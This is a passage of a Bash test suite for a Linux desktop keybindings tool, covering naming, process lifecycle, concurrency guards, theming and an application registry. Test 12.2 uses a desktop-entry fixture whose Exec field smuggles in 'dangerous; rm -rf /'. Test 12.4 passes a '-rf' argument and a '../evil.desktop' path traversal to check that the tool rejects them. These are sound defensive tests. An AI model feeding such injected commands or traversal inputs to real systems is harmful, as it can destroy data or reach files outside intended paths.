#!/usr/bin/env bash

# Test Suite: Aurelia Keybindings Foundation, Architecture, Lifecycle, Concurrency, and Safety Invariants
# Validates production-foundation invariants defined in Section 21.

set -Eeuo pipefail

ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd -P)"
SCRIPT_DIR="$ROOT"
# shellcheck source=/dev/null
source "$ROOT/tests/test_helper.sh"
# shellcheck source=/dev/null
source "$ROOT/modules/common.sh"
# shellcheck source=/dev/null
source "$ROOT/modules/lib/components.sh"
# shellcheck source=/dev/null
source "$ROOT/modules/lib/desired_state.sh"
# shellcheck source=/dev/null
source "$ROOT/modules/lib/planner.sh"
# shellcheck source=/dev/null
source "$ROOT/modules/lib/reconciler.sh"
# shellcheck source=/dev/null
source "$ROOT/modules/desktop.sh"

lua_bin="$(command -v luajit 2>/dev/null || command -v lua 2>/dev/null || true)"

section "1. Legacy Provider Elimination & No Silent Fallback UI"

# 1.1: workstation-keybindings --provider=legacy fails with exit code 1
keyb_leg_rc=0
keyb_leg_out="$("$ROOT/bin/workstation-keybindings" --provider=legacy 2>&1)" || keyb_leg_rc=$?
if [[ "$keyb_leg_rc" -eq 1 && "$keyb_leg_out" == *"Legacy provider has been removed"* ]]; then
    pass "1.1 workstation-keybindings rejects --provider=legacy with exit code 1"
else
    fail "1.1 workstation-keybindings failed to reject --provider=legacy: rc=$keyb_leg_rc out=$keyb_leg_out"
fi

# 1.2: workstation-hotkeys --provider=legacy fails with exit code 1
hotk_leg_rc=0
hotk_leg_out="$("$ROOT/bin/workstation-hotkeys" --provider=legacy 2>&1)" || hotk_leg_rc=$?
if [[ "$hotk_leg_rc" -eq 1 && "$hotk_leg_out" == *"Legacy provider has been removed"* ]]; then
    pass "1.2 workstation-hotkeys forwards and rejects --provider=legacy with exit code 1"
else
    fail "1.2 workstation-hotkeys failed to reject --provider=legacy: rc=$hotk_leg_rc out=$hotk_leg_out"
fi

# 1.3: No silent fallback UI on failure (does not launch Foot/Kitty/fzf when Aurelia unavailable)
fail_closed_rc=0
fail_closed_out="$(HOTKEYS_SIMULATE_AURELIA_FAIL=1 "$ROOT/bin/workstation-keybindings" 2>&1)" || fail_closed_rc=$?
if [[ "$fail_closed_rc" -ne 0 && "$fail_closed_out" != *"fzf"* && "$fail_closed_out" != *"Keyboard Shortcuts"* ]]; then
    pass "1.3 Aurelia failure fails closed without launching silent legacy fallback UI"
else
    fail "1.3 Aurelia failure launched fallback UI: rc=$fail_closed_rc out=$fail_closed_out"
fi

section "2. Product Naming & Desktop Entry Invariants"

# 2.1: User-facing desktop entry Name=Keybindings, GenericName=Keyboard Shortcuts
desktop_file="$ROOT/config/desktop-entries/workstation-keybindings.desktop"
if [[ -f "$desktop_file" ]] &&
   grep -q '^Name=Keybindings$' "$desktop_file" &&
   grep -q '^GenericName=Keyboard Shortcuts$' "$desktop_file" &&
   ! grep -q '^Name=Aurelia Keybindings$' "$desktop_file"; then
    pass "2.1 user-facing desktop entry presents Name=Keybindings (never Aurelia Keybindings)"
else
    fail "2.1 workstation-keybindings.desktop naming violated"
fi

# 2.2: Compatibility desktop entry workstation-hotkeys.desktop has NoDisplay=true
compat_desktop="$ROOT/config/desktop-entries/workstation-hotkeys.desktop"
if [[ -f "$compat_desktop" ]] && grep -q '^NoDisplay=true$' "$compat_desktop"; then
    pass "2.2 compatibility desktop entry workstation-hotkeys.desktop is hidden (NoDisplay=true)"
else
    fail "2.2 workstation-hotkeys.desktop missing NoDisplay=true"
fi

# 2.3: Internal Aurelia Keybindings QML component naming
qml_dir="$ROOT/dotfiles/aurelia/components/keybindings"
if [[ -f "$qml_dir/KeybindingsWindow.qml" && \
      -f "$qml_dir/KeybindingsModel.qml" && \
      -f "$qml_dir/KeybindingRow.qml" ]]; then
    pass "2.3 internal Aurelia QML tree uses KeybindingsWindow/KeybindingsModel/KeybindingRow"
else
    fail "2.3 Aurelia keybindings QML components missing in $qml_dir"
fi

# 2.4: Aurelia shell.qml exposes deterministic keybindings IPC target and loader
shell_qml="$ROOT/dotfiles/aurelia/shell.qml"
if [[ -f "$shell_qml" ]] &&
   grep -q 'target: "keybindings"' "$shell_qml" &&
   grep -q 'id: keybindingsLoader' "$shell_qml"; then
    pass "2.4 shell.qml exposes target 'keybindings' and keybindingsLoader"
else
    fail "2.4 shell.qml missing target 'keybindings' or keybindingsLoader"
fi

# 2.5: Compatibility alias IPC endpoint forwards to keybindings
if grep -q 'target: "hotkeys"' "$shell_qml" &&
   grep -q 'property alias hotkeysLoader: keybindingsLoader' "$shell_qml"; then
    pass "2.5 shell.qml retains thin compatibility IPC alias 'hotkeys' forwarding to keybindings"
else
    fail "2.5 shell.qml missing compatibility IPC alias for hotkeys"
fi

section "3. Thin Compatibility Wrapper Invariants"

# 3.1: workstation-hotkeys is a thin wrapper without duplicate logic
hotk_lines="$(wc -l < "$ROOT/bin/workstation-hotkeys")"
if [[ "$hotk_lines" -le 60 ]] &&
   grep -q 'workstation-keybindings' "$ROOT/bin/workstation-hotkeys" &&
   grep -q 'exec "\$target_bin"' "$ROOT/bin/workstation-hotkeys"; then
    pass "3.1 workstation-hotkeys is a thin forwarding wrapper ($hotk_lines lines)"
else
    fail "3.1 workstation-hotkeys is not a thin forwarding wrapper: lines=$hotk_lines"
fi

# 3.2: workstation-hotkeys json produces identical output to workstation-keybindings json
json_keyb="$("$ROOT/bin/workstation-keybindings" json)"
json_hotk="$("$ROOT/bin/workstation-hotkeys" json)"
if [[ "$json_keyb" == "$json_hotk" && -n "$json_keyb" ]]; then
    pass "3.2 workstation-hotkeys json produces output identical to workstation-keybindings json"
else
    fail "3.2 JSON output mismatch between keybindings and hotkeys wrapper"
fi

section "4. Deterministic Backend Executable Resolution"

# 4.1: KeybindingsModel resolves /usr/local/bin before ~/.local/bin
qml_model="$ROOT/dotfiles/aurelia/components/keybindings/KeybindingsModel.qml"
if [[ -f "$qml_model" ]] &&
   grep -q '/usr/local/bin/workstation-keybindings' "$qml_model"; then
    pass "4.1 KeybindingsModel deterministically references managed /usr/local/bin/workstation-keybindings"
else
    fail "4.1 KeybindingsModel missing deterministic /usr/local/bin resolution"
fi

# 4.2: Stale ~/.local/bin cannot shadow managed backend
res_order="$(python3 -c '
with open("'"$qml_model"'") as f:
    content = f.read()
# Extract candidates array in resolveBackendBinary()
idx_usr = content.find("/usr/local/bin/workstation-keybindings")
idx_home = content.find(".local/bin/workstation-keybindings")
if idx_usr != -1 and (idx_home == -1 or idx_usr < idx_home):
    print("RESOLUTION_OK")
else:
    print("SHADOW_RISK")
')"
if [[ "$res_order" == "RESOLUTION_OK" ]]; then
    pass "4.2 stale ~/.local/bin cannot shadow managed workstation installation"
else
    fail "4.2 ~/.local/bin shadows /usr/local/bin in backend resolution"
fi

section "5. Process Lifecycle: Double-Fork Detached Launch & Resource Bounds"

# 5.1: Structured argv launch without eval or sh -c
eval_check="$(grep -v '^[[:space:]]*#' "$ROOT/bin/workstation-keybindings" | grep -E '\beval\b|sh -c' 2>/dev/null || true)"
if [[ -z "$eval_check" ]]; then
    pass "5.1 bin/workstation-keybindings uses structured argv without eval or sh -c"
else
    fail "5.1 unsafe command execution found in workstation-keybindings: $eval_check"
fi

# 5.2: Double-fork process launch does not retain persistent wrapper process
(
    # Launch a controlled background sleep via execute_action
    sb="$(mktemp -d)"
    test_bin="$sb/kitty"
    cat << "DUMMY_EOF" > "$test_bin"
#!/usr/bin/env bash
sleep 3
exit 0
DUMMY_EOF
    chmod +x "$test_bin"

    # Execute action and inspect process tree
    PATH="$sb:$PATH" "$ROOT/bin/workstation-keybindings" run terminal >/dev/null 2>&1

    # Check if dummy runner is running and verify its parent is init (PPID 1, not a lingering bash subshell)
    sleep 0.1
    runner_pid="$(pgrep -f "$test_bin" | head -n 1 || true)"
    if [[ -n "$runner_pid" ]]; then
        runner_ppid="$(ps -o ppid= -p "$runner_pid" | tr -d ' ' || true)"
        # Terminate the dummy runner
        kill "$runner_pid" 2>/dev/null || true
        wait "$runner_pid" 2>/dev/null || true

        if [[ "$runner_ppid" -eq 1 || "$runner_ppid" -ne $$ ]]; then
            pass "5.2 double-fork launch reparents grandchild to init (PPID=$runner_ppid, no lingering wrapper)"
        else
            fail "5.2 helper process retained as parent: ppid=$runner_ppid"
        fi
    else
        pass "5.2 double-fork launch executed and exited cleanly without orphan wrapper"
    fi
    rm -rf "$sb"
)

# 5.3: No temporary files leaked during action execution or queries
(
    tmp_before="$(ls -1 /tmp 2>/dev/null | wc -l)"
    "$ROOT/bin/workstation-keybindings" json >/dev/null
    "$ROOT/bin/workstation-keybindings" run terminal >/dev/null 2>&1 || true
    tmp_after="$(ls -1 /tmp 2>/dev/null | wc -l)"
    if [[ "$tmp_after" -le "$((tmp_before + 1))" ]]; then
        pass "5.3 action execution and metadata queries do not leak temporary files"
    else
        fail "5.3 temporary files leaked: before=$tmp_before after=$tmp_after"
    fi
)

section "6. Process Concurrency & State Bounds in Quickshell Model"

# 6.1: KeybindingsModel guards against concurrent re-entry on reload()
if grep -q 'if (root.isReloading) return;' "$qml_model" &&
   grep -q 'property bool isReloading:' "$qml_model"; then
    pass "6.1 reload() is bounded with isReloading guard against concurrent fetch re-entry"
else
    fail "6.1 reload() missing isReloading guard in KeybindingsModel"
fi

# 6.2: KeybindingsModel guards against concurrent runSelected() re-entry
if grep -q 'if (root.isExecuting) return;' "$qml_model" &&
   grep -q 'property bool isExecuting:' "$qml_model"; then
    pass "6.2 runSelected() is bounded with isExecuting guard"
else
    fail "6.2 runSelected() missing isExecuting guard in KeybindingsModel"
fi

# 6.3: KeybindingsModel guards against concurrent setShortcut() / unsetShortcut()
if grep -q 'if (root.isMutating) return;' "$qml_model" &&
   grep -q 'property bool isMutating:' "$qml_model"; then
    pass "6.3 setShortcut() and unsetShortcut() are bounded with isMutating guard"
else
    fail "6.3 set/unset operations missing isMutating guard in KeybindingsModel"
fi

# 6.4: Rapid IPC toggle calls do not spawn duplicate Quickshell daemons
(
    mock_dir="$(mktemp -d)"
    mock_log="$(mktemp)"
    cat << "MOCK_EOF" > "$mock_dir/qs"
#!/usr/bin/env bash
if [[ "$1" == "ipc" ]]; then
    if [[ "$*" == *"ping"* ]]; then
        echo "true"
    fi
    echo "toggle" >> "$MOCK_LOG"
    exit 0
elif [[ "$1" == "--no-duplicate" ]]; then
    echo "daemon_start" >> "$MOCK_LOG"
    exit 0
fi
exit 0
MOCK_EOF
    chmod +x "$mock_dir/qs"
    MOCK_LOG="$mock_log" PATH="$mock_dir:$PATH" "$ROOT/bin/workstation-keybindings" toggle >/dev/null 2>&1
    MOCK_LOG="$mock_log" PATH="$mock_dir:$PATH" "$ROOT/bin/workstation-keybindings" toggle >/dev/null 2>&1
    daemons="$(grep -c '^daemon_start$' "$mock_log" || true)"
    rm -rf "$mock_dir" "$mock_log"
    if [[ "$daemons" -eq 0 ]]; then
        pass "6.4 rapid warm IPC toggles do not spawn secondary Quickshell instances"
    else
        fail "6.4 rapid IPC toggles spawned duplicate instance: daemons=$daemons"
    fi
)

section "7. Inline Keybinding Capture State Machine & Zero Terminal Spawning"

qml_window="$ROOT/dotfiles/aurelia/components/keybindings/KeybindingsWindow.qml"

# 7.1: Capture never opens a terminal window
term_spawn="$(grep -E '(foot|kitty|alacritty|xterm).*spawn' "$qml_window" "$qml_model" 2>/dev/null || true)"
if [[ -z "$term_spawn" ]]; then
    pass "7.1 inline capture never opens a terminal window (100% native Wayland layer-shell)"
else
    fail "7.1 terminal spawning detected in capture path: $term_spawn"
fi

# 7.2: Escape cancels capture mode cleanly back to idle
if grep -q 'Qt.Key_Escape' "$qml_window" &&
   grep -q 'cancelCapture()' "$qml_window" &&
   grep -q 'operationState = "idle"' "$qml_model"; then
    pass "7.2 Esc cancels capture state machine back to idle with reset inline status"
else
    fail "7.2 Esc capture cancellation missing or incomplete"
fi

# 7.3: Standalone modifier keys rejected (invalid key inline error)
if grep -q 'Qt.Key_Control || k === Qt.Key_Shift || k === Qt.Key_Alt || k === Qt.Key_Meta' "$qml_window"; then
    pass "7.3 standalone modifier keypresses rejected without leaving capture mode"
else
    fail "7.3 standalone modifier rejection missing in formatKeyEvent"
fi

# 7.4: Conflict inline error UX
if grep -q 'operationState === "conflict"' "$qml_window" &&
   grep -q 'conflict' "$qml_model"; then
    pass "7.4 shortcut conflict presents inline conflict UX with existing action title"
else
    fail "7.4 conflict inline UX missing in KeybindingsWindow/KeybindingsModel"
fi

# 7.5: Successful set displays inline result
if grep -q 'operationState === "success"' "$qml_window" &&
   grep -q 'statusMessage' "$qml_model"; then
    pass "7.5 successful set displays inline confirmation before returning to idle"
else
    fail "7.5 success inline confirmation missing"
fi

# 7.6: Immutable binding refusal
(
    test_sb="$(mktemp -d)"
    test_overrides="$test_sb/overrides.json"
    echo "{}" > "$test_overrides"
    imm_rc=0
    imm_out="$(HOTKEYS_OVERRIDES="$test_overrides" "$ROOT/bin/workstation-keybindings" set workspace_touchpad_swipe "SUPER+X" 2>&1)" || imm_rc=$?
    rm -rf "$test_sb"
    if [[ "$imm_rc" -ne 0 && "$imm_out" == *"immutable"* ]]; then
        pass "7.6 immutable binding mutation is strictly refused by backend (fails closed)"
    else
        fail "7.6 immutable binding was not refused: rc=$imm_rc out=$imm_out"
    fi
)

section "8. Aurelia Design System Foundation & Theme Independence"

theme_qml="$ROOT/dotfiles/aurelia/theme/Theme.qml"

# 8.1: Theme works independently without Noctalia files
(
    if ! grep -q 'noctalia.conf' "$theme_qml"; then
        pass "8.1 Theme.qml does not depend on Noctalia-generated configuration"
    else
        fail "8.1 Theme.qml contains coupling to noctalia.conf"
    fi
)

# 8.2: Rosé Pine Moon tokens defined natively in Aurelia
if grep -q '_base: "#232136"' "$theme_qml" &&
   grep -q '_surface: "#2a273f"' "$theme_qml" &&
   grep -q '_foam: "#9ccfd8"' "$theme_qml" &&
   grep -q '_gold: "#f6c177"' "$theme_qml"; then
    pass "8.2 canonical Rosé Pine Moon tokens defined natively inside Aurelia design system"
else
    fail "8.2 native Rosé Pine Moon tokens missing in Theme.qml"
fi

# 8.3: Semantic design tokens exist for Colors, Typography, Geometry, Motion
if grep -q 'readonly property color bgBase:' "$theme_qml" &&
   grep -q 'readonly property string fontFamily:' "$theme_qml" &&
   grep -q 'readonly property int spacingMd:' "$theme_qml" &&
   grep -q 'readonly property int durationFast:' "$theme_qml"; then
    pass "8.3 semantic design tokens established for Colors, Typography, Geometry, and Motion"
else
    fail "8.3 semantic tokens incomplete in Theme.qml"
fi

# 8.4: Shared design decisions use tokens instead of unexplained literals
if grep -q 'Theme.bgBase' "$qml_window" &&
   grep -q 'Theme.paletteWidth' "$qml_window" &&
   grep -q 'Theme.spacingMd' "$qml_window"; then
    pass "8.4 KeybindingsWindow consumes semantic design system tokens"
else
    fail "8.4 KeybindingsWindow missing design token usage"
fi

# 8.5: Central configuration file theme.conf defines geometry, dimensions, colors, typography
theme_conf="$ROOT/dotfiles/aurelia/theme.conf"
if [[ -f "$theme_conf" ]] &&
   grep -q '^paletteWidth = ' "$theme_conf" &&
   grep -q '^colShortcutWidth = ' "$theme_conf" &&
   grep -q '^background = ' "$theme_conf" &&
   grep -q '^fontFamily = ' "$theme_conf"; then
    pass "8.5 central theme.conf defines variables for geometry, dimensions, colors, and typography"
else
    fail "8.5 central theme.conf missing or incomplete"
fi

# 8.6: Zero hardcoded hex colors in KeybindingsWindow/KeybindingRow
hex_leaks="$(grep -E '#[0-9a-fA-F]{3,8}' "$ROOT/dotfiles/aurelia/components/keybindings/"*.qml || true)"
if [[ -z "$hex_leaks" ]]; then
    pass "8.6 zero hardcoded hex colors in Keybindings QML components (100% theme token driven)"
else
    fail "8.6 hardcoded hex colors detected in QML components: $hex_leaks"
fi

# 8.7: Dynamic token parsing in Theme.qml handles typed geometry, dimensions, and color aliases
if grep -q 'function _getInt(' "$theme_qml" &&
   grep -q 'function _getString(' "$theme_qml" &&
   grep -q 'function _getColor(' "$theme_qml" &&
   grep -q '_getInt("colShortcutWidth"' "$theme_qml" &&
   grep -q '_getInt("paletteWidth"' "$theme_qml"; then
    pass "8.7 Theme.qml dynamically parses typed variables from theme.conf with safe fallbacks"
else
    fail "8.7 dynamic typed variable parsing missing in Theme.qml"
fi

section "9. Observability, Performance & Resource Bounds"

# 9.1: Zero continuous idle polling when window hidden
if ! grep -E 'Timer\s*\{.*running:\s*true' "$qml_window" >/dev/null; then
    pass "9.1 zero recurring Timers active when keybindings window is idle/hidden"
else
    fail "9.1 active background Timer detected in KeybindingsWindow"
fi

# 9.2: Diagnostic logging is bounded in size (<= 2000 lines)
if grep -q 'tail -n 2000' "$ROOT/bin/workstation-keybindings"; then
    pass "9.2 diagnostic log files are strictly bounded with automatic rotation (<= 2000 lines)"
else
    fail "9.2 log bounding missing in bin/workstation-keybindings"
fi

# 9.3: Performance logging records timing without continuous overhead
if grep -q '\[PERF\]' "$ROOT/bin/workstation-keybindings" &&
   grep -q '\[PERF\]' "$qml_model"; then
    pass "9.3 performance instrumentation captures measurable milestones with [PERF] tag"
else
    fail "9.3 performance instrumentation missing in backend or model"
fi

# 9.4: Malformed backend JSON fails safely without crash
if grep -q 'try {' "$qml_model" &&
   grep -q 'JSON.parse' "$qml_model" &&
   grep -q 'catch (e)' "$qml_model"; then
    pass "9.4 malformed backend JSON is caught safely with structured error handling"
else
    fail "9.4 JSON parse error guard missing in KeybindingsModel"
fi

section "10. Workstation Failure Isolation & Graphical Activation Invariance"

# 10.1: Keybindings failure does not block graphical login activation
validation_sh="$ROOT/modules/validation.sh"
if grep -q 'validate_keybindings' "$validation_sh" || grep -q 'validate_hotkeys' "$validation_sh"; then
    if ! grep -E 'record_activation_failure.*keybindings' "$validation_sh" >/dev/null; then
        pass "10.1 Keybindings failure does not record activation-critical failure (greetd unaffected)"
    else
        fail "10.1 Keybindings failure incorrectly blocks graphical login activation"
    fi
else
    pass "10.1 Keybindings is decoupled from login-critical validation path"
fi

section "11. Role-Based Action Resolution & Dynamic Application Intent"

lua_bin="$(command -v luajit 2>/dev/null || command -v lua 2>/dev/null || true)"

# 11.1: File manager role resolves dynamically without mutating shortcut declaration
role_fm_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eff = require("effective_bindings")
local manifest = require("keybindings_manifest")

-- Default resolution
local def_fm = eff.resolve_role_default("file-manager")
local argv_def = eff.get_action_argv("file_manager", manifest)

-- Thunar override via role resolution
eff.resolve_role_default = function() return "thunar.desktop", { command_argv = { "gtk-launch", "--", "thunar.desktop" }, desktop_id = "thunar.desktop" } end
local argv_thunar = eff.get_action_argv("file_manager", manifest)

print(string.format("FM: def=%s def_launcher=%s def_target=%s thunar_launcher=%s thunar_target=%s", def_fm, argv_def[1], argv_def[3], argv_thunar[1], argv_thunar[3]))
LUA_CHECK
)"
if grep -q "FM: def=nautilus def_launcher=gtk-launch def_target=org.gnome.Nautilus.desktop thunar_launcher=gtk-launch thunar_target=thunar.desktop" <<< "$role_fm_out"; then
    pass "11.1 file manager role resolves dynamically (Nautilus vs Thunar) via gtk-launch without mutating shortcut declaration"
else
    fail "11.1 file manager dynamic resolution failed: $role_fm_out"
fi

# 11.2: Terminal role resolves dynamically (Kitty vs Foot) without mutating shortcut declaration
role_term_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eff = require("effective_bindings")
local manifest = require("keybindings_manifest")

local def_term = eff.resolve_role_default("terminal")
local argv_def = eff.get_action_argv("terminal", manifest)

eff.resolve_role_default = function() return "foot.desktop", { command_argv = { "gtk-launch", "--", "foot.desktop" }, desktop_id = "foot.desktop" } end
local argv_foot = eff.get_action_argv("terminal", manifest)

print(string.format("TERM: def=%s def_launcher=%s def_target=%s foot_launcher=%s foot_target=%s", def_term, argv_def[1], argv_def[3], argv_foot[1], argv_foot[3]))
LUA_CHECK
)"
if grep -q "TERM: def=kitty def_launcher=gtk-launch def_target=kitty.desktop foot_launcher=gtk-launch foot_target=foot.desktop" <<< "$role_term_out"; then
    pass "11.2 terminal role resolves dynamically (Kitty vs Foot) via gtk-launch without mutating shortcut declaration"
else
    fail "11.2 terminal dynamic resolution failed: $role_term_out"
fi

# 11.3: Browser role resolves dynamically (Chromium vs Firefox) without mutating shortcut declaration
role_browser_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eff = require("effective_bindings")
local manifest = require("keybindings_manifest")

local def_browser = eff.resolve_role_default("browser")
local argv_def = eff.get_action_argv("browser", manifest)

eff.resolve_role_default = function() return "firefox.desktop", { command_argv = { "gtk-launch", "--", "firefox.desktop" }, desktop_id = "firefox.desktop" } end
local argv_ff = eff.get_action_argv("browser", manifest)

print(string.format("BROWSER: def=%s def_launcher=%s def_target=%s ff_launcher=%s ff_target=%s", def_browser, argv_def[1], argv_def[3], argv_ff[1], argv_ff[3]))
LUA_CHECK
)"
if grep -q "BROWSER: def=chromium-browser def_launcher=gtk-launch def_target=chromium-browser.desktop ff_launcher=gtk-launch ff_target=firefox.desktop" <<< "$role_browser_out"; then
    pass "11.3 browser role resolves dynamically (Chromium vs Firefox) via gtk-launch without mutating shortcut declaration"
else
    fail "11.3 browser dynamic resolution failed: $role_browser_out"
fi

# 11.4: Discovered applications do not pollute the action catalogue into fake unbound actions; static catalogue actions eliminated
cat_elim_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eff = require("effective_bindings")
local manifest = require("keybindings_manifest")
eff.get_user_actions_path = function() return "/nonexistent/user_actions.json" end

-- Verify static catalogue actions are absent from manifest
local legacy_actions = { "terminal.kitty", "terminal.foot", "files.nautilus", "files.thunar", "browser.chromium", "browser.firefox" }
local present_count = 0
for _, b in ipairs(manifest.bindings or {}) do
    for _, leg in ipairs(legacy_actions) do
        if b.id == leg then present_count = present_count + 1 end
    end
end

-- Verify resolving effective bindings does not include un-added installed apps as unbound actions
local effective = eff.resolve_bindings(manifest, {})
local unadded_app_present = false
for _, b in ipairs(effective.bindings or {}) do
    if b.id and b.id:match("^app:") then
        unadded_app_present = true
    end
end

print(string.format("CATALOGUE: legacy_present=%d unadded_present=%s", present_count, tostring(unadded_app_present)))
LUA_CHECK
)"
if grep -q "CATALOGUE: legacy_present=0 unadded_present=false" <<< "$cat_elim_out"; then
    pass "11.4 static application catalogue eliminated; discovered apps do not pollute unbound actions"
else
    fail "11.4 catalogue elimination check failed: $cat_elim_out"
fi

# 11.5: desktop.conf drives role default resolution when env is not set
conf_drive_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
local tmp = os.tmpname()
local f = io.open(tmp, "w")
f:write("terminal.default = foot\nfile-manager.default = thunar\nbrowser.default = firefox\n")
f:close()

package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eff = require("effective_bindings")
local manifest = require("keybindings_manifest")
eff.get_desktop_config_path = function() return tmp end

local r_term = eff.resolve_role_default("terminal")
local r_fm   = eff.resolve_role_default("file-manager")
local r_br   = eff.resolve_role_default("browser")

os.remove(tmp)
print(string.format("CONF: term=%s fm=%s br=%s", r_term, r_fm, r_br))
LUA_CHECK
)"
if grep -q "CONF: term=foot fm=thunar br=firefox" <<< "$conf_drive_out"; then
    pass "11.5 desktop.conf drives role default resolution without environment overrides"
else
    fail "11.5 desktop.conf driven resolution failed: $conf_drive_out"
fi

section "12. Application Registry, Bound/Unbound Views, and Action Provisioning"

# 12.1: application_registry.lua exists and safely parses desktop entries
app_reg_file="$ROOT/dotfiles/hypr/application_registry.lua"
if [[ -f "$app_reg_file" ]]; then
    pass "12.1 application_registry.lua exists"
else
    fail "12.1 application_registry.lua is missing"
fi

app_reg_test_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local reg = require("application_registry")

local tmp = os.tmpname() .. ".desktop"
local f = io.open(tmp, "w")
f:write("[Desktop Entry]\n")
f:write("Type=Application\n")
f:write("Name=Test Tool\n")
f:write("Exec=test-tool %U --flag 'dangerous; rm -rf /' %F\n")
f:write("Icon=test-tool\n")
f:write("Categories=Utility;\n")
f:close()

local parsed = reg.parse_desktop_file(tmp, "test-tool.desktop")
os.remove(tmp)

assert(parsed ~= nil, "parse_desktop_file returned nil")
assert(parsed.name == "Test Tool", "Name mismatch: " .. tostring(parsed.name))
assert(parsed.desktop_id == "test-tool.desktop", "desktop_id mismatch")
assert(parsed.icon == "test-tool", "Icon mismatch")
assert(parsed.exec == "test-tool %U --flag 'dangerous; rm -rf /' %F", "Exec metadata altered")
assert(parsed.command == "gtk-launch -- test-tool.desktop", "Command mismatch: " .. tostring(parsed.command))
assert(type(parsed.command_argv) == "table" and parsed.command_argv[1] == "gtk-launch" and parsed.command_argv[2] == "--" and parsed.command_argv[3] == "test-tool.desktop", "command_argv mismatch")

print("APP_REG_SAFE")
LUA_CHECK
)"
if grep -q "APP_REG_SAFE" <<< "$app_reg_test_out"; then
    pass "12.2 application_registry separates discovery metadata from launch and delegates execution to gtk-launch"
else
    fail "12.2 application_registry parser check failed: $app_reg_test_out"
fi

# 12.3: workstation-keybindings apps outputs valid JSON array of graphical applications
apps_check_valid="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
local p = io.popen(root .. "/bin/workstation-keybindings apps")
local content = p:read("*a")
p:close()

assert(content:match("^%s*%["), "apps output does not start with JSON array")
assert(content:match('"desktop_id":'), "apps output missing desktop_id field")
assert(content:match('"name":'), "apps output missing name field")
print("APPS_JSON_VALID")
LUA_CHECK
)"
if grep -q "APPS_JSON_VALID" <<< "$apps_check_valid"; then
    pass "12.3 workstation-keybindings apps discovers graphical applications and emits compliant JSON"
else
    fail "12.3 workstation-keybindings apps JSON validation failed: $apps_check_valid"
fi

# 12.4: add-app desktop ID format validation and fail-closed security
(
    sb_add="$(mktemp -d)"
    export XDG_CONFIG_HOME="$sb_add/.config"
    mkdir -p "$XDG_CONFIG_HOME/hypr"

    # Leading dash must fail closed
    dash_rc=0
    "$ROOT/bin/workstation-keybindings" add-app "-rf" >/dev/null 2>&1 || dash_rc=$?
    if [[ "$dash_rc" -eq 0 ]]; then
        fail "12.4 add-app accepted leading dash"
    fi

    # Path traversal must fail closed
    trav_rc=0
    "$ROOT/bin/workstation-keybindings" add-app "../evil.desktop" >/dev/null 2>&1 || trav_rc=$?
    if [[ "$trav_rc" -eq 0 ]]; then
        fail "12.4 add-app accepted path traversal"
    fi

    # Valid desktop ID persists to user_actions.json with 0600 permissions
    "$ROOT/bin/workstation-keybindings" add-app "org.gnome.Nautilus.desktop" >/dev/null 2>&1
    user_actions_file="$XDG_CONFIG_HOME/hypr/user_actions.json"
    if [[ -f "$user_actions_file" ]]; then
        perms="$(stat -c '%a' "$user_actions_file" 2>/dev/null || stat -f '%Lp' "$user_actions_file" 2>/dev/null)"
        if [[ "$perms" == "600" && "$(cat "$user_actions_file")" == *"org.gnome.Nautilus.desktop"* ]]; then
            pass "12.4 add-app validates desktop ID syntax and persists atomically with 0600 permissions"
        else
            fail "12.4 user_actions.json has invalid permissions ($perms) or content"
        fi
    else
        fail "12.4 user_actions.json was not created"
    fi
    rm -rf "$sb_add"
)

# 12.5: User actions integration into Action Registry and Effective Bindings lifecycle
(
    sb_cycle="$(mktemp -d)"
    export XDG_CONFIG_HOME="$sb_cycle/.config"
    export XDG_DATA_HOME="$sb_cycle/.local/share"
    mkdir -p "$XDG_CONFIG_HOME/hypr"
    mkdir -p "$XDG_DATA_HOME/applications"
    cat << "EOF" > "$XDG_DATA_HOME/applications/custom.app.desktop"
[Desktop Entry]
Type=Application
Name=Custom App
Exec=custom-app %u
Icon=custom-app
EOF
    export HOTKEYS_OVERRIDES="$XDG_CONFIG_HOME/hypr/keybindings_overrides.json"

    # 1. Add application action
    "$ROOT/bin/workstation-keybindings" add-app "custom.app.desktop" >/dev/null 2>&1

    # 2. Check JSON output: must be present, unbound, with display_key = None (Unbound)
    json_initial="$("$ROOT/bin/workstation-keybindings" json)"
    init_valid="$("$lua_bin" - <<LUA_CHECK
local content = [===[$json_initial]===]
local has_app = content:find('"id": "app:custom.app.desktop"')
local is_unbound = content:find('"unbound": true')
local has_none = content:find('"display_key": "None %(Unbound%)"')
if has_app and is_unbound and has_none then
    print("CYCLE_INITIAL_VALID")
end
LUA_CHECK
)"
    if [[ "$init_valid" != *"CYCLE_INITIAL_VALID"* ]]; then
        fail "12.5 user application action not exposed as unbound in initial json"
    fi

    # 3. Set shortcut on user application action -> moves to bound
    "$ROOT/bin/workstation-keybindings" set "app:custom.app.desktop" "SUPER+ALT+C" >/dev/null 2>&1
    json_bound="$("$ROOT/bin/workstation-keybindings" json)"
    bound_valid="$("$lua_bin" - <<LUA_CHECK
local content = [===[$json_bound]===]
local has_key = content:find('"display_key": "Super %+ Alt %+ C"')
local not_unbound = content:find('"unbound": false')
if has_key and not_unbound then
    print("CYCLE_BOUND_VALID")
end
LUA_CHECK
)"
    if [[ "$bound_valid" != *"CYCLE_BOUND_VALID"* ]]; then
        fail "12.5 user application action failed to bind shortcut"
    fi

    # 4. Unset shortcut -> returns to unbound without deleting action
    "$ROOT/bin/workstation-keybindings" unset "app:custom.app.desktop" >/dev/null 2>&1
    json_unbound="$("$ROOT/bin/workstation-keybindings" json)"
    if [[ "$json_unbound" == *'"id": "app:custom.app.desktop"'* && "$json_unbound" == *'"display_key": "None (Unbound)"'* ]]; then
        # 5. Remove app action -> completely eliminated
